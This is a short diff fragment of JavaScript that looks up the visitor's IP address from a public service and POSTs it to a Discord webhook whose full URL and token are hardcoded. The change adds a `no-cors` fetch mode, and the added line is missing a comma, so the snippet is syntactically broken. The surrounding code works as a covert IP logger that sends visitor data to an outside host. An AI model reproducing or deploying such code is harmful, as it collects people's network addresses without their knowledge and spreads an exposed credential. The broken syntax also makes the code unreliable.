@@ -9,6 +9,7 @@ fetch("https://api.ipify.org?format=json")
     // Send the IP address to the Discord webhook
     fetch("https://discord.com/api/webhooks/1031273977118740501/IsAWXX8MZ6akhfXsBKtH00HAbZO1QooRf6RcwH5x9My_gYv1Y587Q8sW6xPGO6EcPV2r", {
       method: "POST",
+      mode: "no-cors"
       headers: {
         "Content-Type": "application/json",
       },
